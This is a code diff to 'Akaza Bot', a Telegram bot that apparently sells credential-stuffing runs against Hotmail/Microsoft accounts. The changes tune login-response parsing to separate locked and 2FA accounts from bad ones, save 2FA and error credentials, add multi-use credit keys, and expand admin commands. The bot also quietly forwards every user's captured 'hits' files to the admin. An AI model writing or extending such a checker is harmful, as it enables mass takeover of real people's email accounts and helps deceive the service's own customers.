@@ -83,7 +83,12 @@ class AkazaDatabase:
             id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT,
             status TEXT, details TEXT, date TEXT)''')
         self._execute('''CREATE TABLE IF NOT EXISTS keys (
-            key_code TEXT PRIMARY KEY, amount INTEGER)''')
+            key_code TEXT PRIMARY KEY, amount INTEGER, max_uses INTEGER DEFAULT 1, uses_left INTEGER DEFAULT 1)''')
+        # Handle migrations for existing keys Table
+        try:
+            self._execute('ALTER TABLE keys ADD COLUMN max_uses INTEGER DEFAULT 1')
+            self._execute('ALTER TABLE keys ADD COLUMN uses_left INTEGER DEFAULT 1')
+        except: pass
         self.add_user(ADMIN_ID, "Admin", "Admin")
         self._execute('UPDATE users SET is_mod = 1, has_access = 1, credits = 999999 WHERE user_id = ?', (ADMIN_ID,))
     def add_user(self, uid, username, first_name):
@@ -166,13 +171,16 @@ class AkazaDatabase:
     def list_mods(self) -> list:
         res = self._execute('SELECT user_id, username FROM users WHERE is_mod = 1', fetchall=True)
         return [{'uid': row['user_id'], 'username': row['username']} for row in res] if res else []
-    def create_key(self, amount: int) -> str:
+    def create_key(self, amount: int, max_uses: int = 1) -> str:
         key_code = f"AKAZA-{str(uuid.uuid4()).split('-')[0].upper()}-{str(uuid.uuid4()).split('-')[1].upper()}"
-        self._execute('INSERT INTO keys (key_code, amount) VALUES (?, ?)', (key_code, amount))
+        self._execute('INSERT INTO keys (key_code, amount, max_uses, uses_left) VALUES (?, ?, ?, ?)', (key_code, amount, max_uses, max_uses))
         return key_code
-    def get_key_amount(self, key_code: str) -> int:
-        res = self._execute('SELECT amount FROM keys WHERE key_code = ?', (key_code,), fetchone=True)
-        return res['amount'] if res else 0
+    def get_key_info(self, key_code: str) -> dict:
+        res = self._execute('SELECT amount, uses_left FROM keys WHERE key_code = ?', (key_code,), fetchone=True)
+        return dict(res) if res else None
+    def use_key(self, key_code: str):
+        self._execute('UPDATE keys SET uses_left = uses_left - 1 WHERE key_code = ?', (key_code,))
+        self._execute('DELETE FROM keys WHERE key_code = ? AND uses_left <= 0', (key_code,))
     def delete_key(self, key_code: str):
         self._execute('DELETE FROM keys WHERE key_code = ?', (key_code,))
 akaza_db = AkazaDatabase(DB)
@@ -355,10 +363,10 @@ class AkazaChecker:
             resp_low = r3.text.lower()
             if any(x in resp_low for x in ["account or password is incorrect", "password is incorrect", "doesn't exist"]):
                 return None, None
-            if any(x in r3.text for x in ["identity/confirm", "Consent", "/Abuse", "help us protect", "recover?mkt"]):
-                # Signal 2FA/Secure to avoid marking as BAD
+            if any(x in r3.text for x in ["identity/confirm", "Consent", "/Abuse", "help us protect", "recover?mkt", "account has been locked", "proof/verify", "Acknowledge", "security challenge"]):
+                # Signal 2FA/Secure/Locked to avoid marking as BAD
                 return "2FA", None
-            if "too many times" in resp_low:
+            if any(x in resp_low for x in ["too many times", "temporary problem", "try again later"]):
                 return "RETRY", None
             # Extract auth code
             loc = r3.headers.get("Location", "")
@@ -1187,6 +1195,7 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
     status_msg = await (u.callback_query.message.reply_text("🚀 Starting session...") if u.callback_query else u.message.reply_text("🚀 Starting session..."))
     hits, bad, tfa, err, checked, start_t, last_up, last_h = 0, 0, 0, 0, 0, time.time(), 0, []
     all_hits_results, points_results_raw, ms_hits_results_raw, codes_results, inbox_results, psn_results = [], [], [], [], [], []
+    tfa_results, err_results = [], []
     sid = str(uuid.uuid4().hex[:6])
     sem, up_lock = asyncio.Semaphore(thr), asyncio.Lock()
     async def worker(line):
@@ -1315,8 +1324,12 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
                 # except to Admin via the final results file (silent report)
                 
                 last_h.append(email); last_h = last_h[-5:]
-            elif st == '2fa': tfa += 1
-            elif st == 'error': err += 1
+            elif st == '2fa':
+                tfa += 1
+                tfa_results.append(f"{data['email']}:{data['password']}")
+            elif st in ['error', 'retry']:
+                err += 1
+                err_results.append(f"{data.get('email', 'unknown')}:{data.get('password', 'unknown')}")
             else: bad += 1
             async with up_lock:
                 if time.time() - last_up > 3 or checked == len(lines):
@@ -1347,13 +1360,13 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
         return
     # FINAL REPORTING (FILES TO ADMIN)
     user_handle = f"@{u.effective_user.username}" if u.effective_user.username else u.effective_user.first_name
-    admin_summary = f"📢 <b>Session Complete</b>\nUser: {user_handle} ({uid})\nTotal: {len(lines)}\nHits: {hits}"
+    admin_summary = f"📢 <b>Session Complete</b>\nUser: {user_handle} ({uid})\nTotal: {len(lines)}\nHits: {hits}\n2FA/Locked: {tfa}\nErrors: {err}"
     # Sort: points high→low, ms active first
     points_sorted = [line for _, line in sorted(points_results_raw, key=lambda x: x[0], reverse=True)]
     ms_sorted = [line for _, line in sorted(ms_hits_results_raw, key=lambda x: x[0], reverse=True)]
     # Save results to temporary files and send
     files_to_send = [
-        ("hits.txt", all_hits_results),
+        ("@Akaza_isnt valids.txt", all_hits_results),
         ("microsoft_hits.txt", ms_sorted),
         ("points.txt", points_sorted),
         ("codes.txt", codes_results),
@@ -1365,14 +1378,17 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
         if content_list:
             path = f"{uid}_{filename}"
             with open(path, 'w', encoding='utf-8') as f:
-                f.write(f"Generated by Akaza Bot for {user_handle}\n")
+                if filename == "@Akaza_isnt valids.txt":
+                    f.write("HOTMAIL VALIDS CHECKED BY AKAZA BOT\n")
+                else:
+                    f.write(f"Generated by Akaza Bot for {user_handle}\n")
                 f.write("\n".join(content_list))
             
             with open(path, 'rb') as f:
                 # Admin gets results silently
                 await c.bot.send_document(ADMIN_ID, f, filename=filename, caption=f"📄 {filename} from {user_handle}")
                 
-                # User only gets their copy (silent to admin means user doesn't know copy went to admin)
+                # User only gets their copy
                 f.seek(0)
                 await c.bot.send_document(uid, f, filename=filename, caption=f"✅ Your {filename} is ready.")
             os.remove(path)
@@ -1556,6 +1572,8 @@ async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
             "  • 💎 Premium users bypass the queue\n\n"
             "🛒 Support: @Akaza_isnt"
         )
+        if akaza_db.is_mod(uid):
+            txt += "\n\n🛠 <b>Admin Mode:</b>\nType <code>!!help</code> for the admin command list."
         await q.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(_back_btn()), parse_mode="HTML")
 
     # ── Admin panel ───────────────────────────────────────────────────────────
@@ -1641,10 +1659,11 @@ async def cmd_redeem(u: Update, c: ContextTypes.DEFAULT_TYPE):
         await u.message.reply_text("⚠️ Usage: /redeem <key>")
         return
     key_code = c.args[0]
-    amount = akaza_db.get_key_amount(key_code)
-    if amount > 0:
+    key_info = akaza_db.get_key_info(key_code)
+    if key_info and key_info['uses_left'] > 0:
+        amount = key_info['amount']
         akaza_db.add_credits(uid, amount)
-        akaza_db.delete_key(key_code)
+        akaza_db.use_key(key_code)
         await u.message.reply_text(f"✅ <b>Successfully Redeemed!</b>\nYou have received <code>{amount}</code> credits.", parse_mode="HTML")
     else:
         await u.message.reply_text("❌ <b>Invalid or already redeemed key.</b>", parse_mode="HTML")
@@ -1653,16 +1672,16 @@ async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
     if not akaza_db.is_mod(uid): return
     m = u.message.text.split(); cmd, args = m[0].lower(), m[1:]
     try:
-        if cmd == "!!addcredits" and len(args) >= 2: akaza_db.add_credits(int(args[0]), int(args[1])); await u.message.reply_text("✅")
-        elif cmd == "!!setcredits" and len(args) >= 2: akaza_db.set_credits(int(args[0]), int(args[1])); await u.message.reply_text("✅")
-        elif cmd == "!!resetcredits" and args: akaza_db.reset_credits(int(args[0])); await u.message.reply_text("✅")
-        elif cmd == "!!grant" and args: akaza_db.grant_access(int(args[0])); await u.message.reply_text("✅")
-        elif cmd == "!!revoke" and args: akaza_db.revoke_access(int(args[0])); await u.message.reply_text("✅")
-        elif cmd == "!!addaccess" and len(args) >= 2: akaza_db.grant_timed_access(int(args[0]), int(args[1])); await u.message.reply_text("✅")
-        elif cmd == "!!ban" and args: akaza_db.ban(int(args[0])); await u.message.reply_text("✅")
-        elif cmd == "!!unban" and args: akaza_db.unban(int(args[0])); await u.message.reply_text("✅")
-        elif cmd == "!!mod" and args and uid == ADMIN_ID: akaza_db.set_mod(int(args[0]), 1); await u.message.reply_text("✅")
-        elif cmd == "!!unmod" and args and uid == ADMIN_ID: akaza_db.set_mod(int(args[0]), 0); await u.message.reply_text("✅")
+        if cmd == "!!addcredits" and len(args) >= 2: akaza_db.add_credits(int(args[0]), int(args[1])); await u.message.reply_text("✅ Credits Added.")
+        elif cmd == "!!setcredits" and len(args) >= 2: akaza_db.set_credits(int(args[0]), int(args[1])); await u.message.reply_text("✅ Credits Set.")
+        elif cmd == "!!resetcredits" and args: akaza_db.reset_credits(int(args[0])); await u.message.reply_text("✅ Credits Reset.")
+        elif cmd == "!!grant" and args: akaza_db.grant_access(int(args[0])); await u.message.reply_text("✅ Access Granted.")
+        elif cmd == "!!revoke" and args: akaza_db.revoke_access(int(args[0])); await u.message.reply_text("✅ Access Revoked.")
+        elif cmd == "!!addaccess" and len(args) >= 2: akaza_db.grant_timed_access(int(args[0]), int(args[1])); await u.message.reply_text("✅ Timed Access Added.")
+        elif cmd == "!!ban" and args: akaza_db.ban(int(args[0])); await u.message.reply_text("✅ User Banned.")
+        elif cmd == "!!unban" and args: akaza_db.unban(int(args[0])); await u.message.reply_text("✅ User Unbanned.")
+        elif cmd == "!!mod" and args and uid == ADMIN_ID: akaza_db.set_mod(int(args[0]), 1); await u.message.reply_text("✅ Mod Added.")
+        elif cmd == "!!unmod" and args and uid == ADMIN_ID: akaza_db.set_mod(int(args[0]), 0); await u.message.reply_text("✅ Mod Removed.")
         elif cmd == "!!listmods": await u.message.reply_text("\n".join([f"{m['uid']} (@{m['username']})" for m in akaza_db.list_mods()]))
         elif cmd == "!!info" and args: await u.message.reply_text(str(akaza_db.get_user_info(int(args[0]))))
         elif cmd == "!!stats": await u.message.reply_text(str(akaza_db.get_global_stats()))
@@ -1672,17 +1691,39 @@ async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
                 try: await c.bot.send_message(t, txt); count += 1; await asyncio.sleep(0.05)
                 except: pass
             await u.message.reply_text(f"✅ Sent to {count} users.")
-        elif cmd == "!!setthreads" and len(args) >= 2: akaza_db.update_settings(int(args[0]), threads=int(args[1])); await u.message.reply_text("✅")
+        elif cmd == "!!setthreads" and len(args) >= 2: akaza_db.update_settings(int(args[0]), threads=int(args[1])); await u.message.reply_text("✅ Threads Updated.")
         elif cmd == "!!genkey" and args:
             amount = int(args[0])
-            key_code = akaza_db.create_key(amount)
-            await u.message.reply_text(f"✅ <b>Key Generated:</b>\n<code>{key_code}</code>\nCredits: {amount}", parse_mode="HTML")
+            uses = int(args[1]) if len(args) > 1 else 1
+            key_code = akaza_db.create_key(amount, uses)
+            await u.message.reply_text(f"✅ <b>Key Generated:</b>\n<code>{key_code}</code>\nCredits: {amount}\nMax Uses: {uses}", parse_mode="HTML")
         elif cmd == "!!addproxies":
             pxs = u.message.text[len(cmd):].strip().splitlines()
             for p in pxs:
                 if p.strip(): PROXIES_LIST.append(AkazaChecker().format_proxy(p.strip()))
             await u.message.reply_text(f"✅ Added {len(pxs)} global proxies.")
-        elif cmd == "!!help": await u.message.reply_text("!!addcredits !!setcredits !!resetcredits !!grant !!revoke !!addaccess !!ban !!unban !!mod !!unmod !!listmods !!info !!stats !!broadcast !!setthreads !!genkey !!addproxies")
+        elif cmd == "!!help":
+            help_txt = (
+                "🛠 <b>Admin Commands Usage</b>\n"
+                "━━━━━━━━━━━━━━━━━━\n"
+                "<code>!!addcredits &lt;id&gt; &lt;amt&gt;</code> - Add credits\n"
+                "<code>!!setcredits &lt;id&gt; &lt;amt&gt;</code> - Set exact credits\n"
+                "<code>!!resetcredits &lt;id&gt;</code> - Clear credits\n"
+                "<code>!!grant &lt;id&gt;</code> - Permanent access\n"
+                "<code>!!revoke &lt;id&gt;</code> - Remove access\n"
+                "<code>!!addaccess &lt;id&gt; &lt;days&gt;</code> - Timed access\n"
+                "<code>!!genkey &lt;amt&gt; [uses]</code> - Generate key (default 1 use)\n"
+                "<code>!!ban &lt;id&gt;</code> - Ban user\n"
+                "<code>!!unban &lt;id&gt;</code> - Unban user\n"
+                "<code>!!mod &lt;id&gt;</code> - Make moderator\n"
+                "<code>!!unmod &lt;id&gt;</code> - Remove moderator\n"
+                "<code>!!broadcast &lt;msg&gt;</code> - Send to all\n"
+                "<code>!!info &lt;id&gt;</code> - User info\n"
+                "<code>!!stats</code> - Global stats\n"
+                "<code>!!setthreads &lt;id&gt; &lt;n&gt;</code> - Set user threads\n"
+                "<code>!!addproxies</code> - Load global proxies (one per line)\n"
+            )
+            await u.message.reply_text(help_txt, parse_mode="HTML")
     except Exception as e: await u.message.reply_text(f"❌ {e}")
 def main():
     akaza_db.init_db()
